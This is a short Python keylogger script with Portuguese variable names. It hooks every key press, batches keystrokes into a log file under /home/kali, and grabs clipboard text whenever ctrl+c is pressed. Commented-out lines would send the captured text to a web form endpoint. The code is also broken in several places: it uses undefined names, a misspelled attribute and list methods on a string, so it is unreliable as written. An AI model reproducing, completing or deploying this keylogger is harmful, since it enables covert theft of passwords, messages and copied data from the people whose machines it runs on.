#!/usr/bin/python3

import keyboard
from requests import post
from pyperclip import paste

arquivoLog = "/home/kali/relatorio.log" 
teclasApertadas = str(input('Teclas:'))
teclas_especiais = {'space':'', 'enter':'\n'}
#keyboard.on_press(lambda k: teclasApertadas.append(k.name))
#url_form = 'http://127.0.0.1'

def trata_tecla(k):
	if shift in k.modifiers:
		teclasApertadas.pop()
	teclas = k.nome
	
	if len(tecla) > 1:
		tecla = teclas_especiais.get(tecla, '<<{}>>'.format(tecla))
	teclasApertadas.append(tecla)
	
	if len(teclasApertadas) >= 100:
		textoDigitado = "#".join(teclasApertadas)
		teclasApertadas.clear()
		#post(url_form, {'entry.1269107664':texto_digitado})
		with open(arquivoLog, "a") as log:
			log.write(textoDigitado)

keyboard.on_press(trata_tecla)

def trata_copypaste():
	texto_copiado = paste()
	teclasApertadas.extend(list(texto_copiado))

keyboard.add_hotkey('ctrl+c', trata_copypaste)
